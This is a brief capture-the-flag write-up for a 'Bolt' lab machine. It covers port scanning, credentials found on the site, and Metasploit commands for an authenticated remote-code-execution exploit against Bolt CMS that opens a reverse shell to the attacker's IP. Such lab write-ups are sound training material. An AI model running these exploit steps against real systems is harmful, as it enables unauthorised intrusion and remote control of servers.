# Bolt

### Bolt
Nmap scan shows ports 22,80 and 8000 open. Port 80 is a default apache webserver. Port 8000 is another webserver. Visiting around, I found a username: <br />
![image](https://github.com/user-attachments/assets/169e0e0d-8957-4d8d-b53b-95cc6f6ca7be)<br />
And also a password: <br />
![image](https://github.com/user-attachments/assets/c8d4e6fb-6b5c-4d8e-8da3-74e883fe6aa9)<br />
So I log into the admin panel at `/bolt/login` and found the version on the bottom left of the page: <br />
![image](https://github.com/user-attachments/assets/003af5a5-14cb-4c5f-a83e-e4e2db905941)<br />
Let's just use metasploit for this. Open msfconsole and type: <br />
    
    use exploit/unix/webapp/bolt_authenticated_rce
    set lhost YOUR_IP
    set rhosts TARGET_IP
    set username bolt
    set password boltadmin123

This gives me a reverse shell. The flag is inside `/home`.
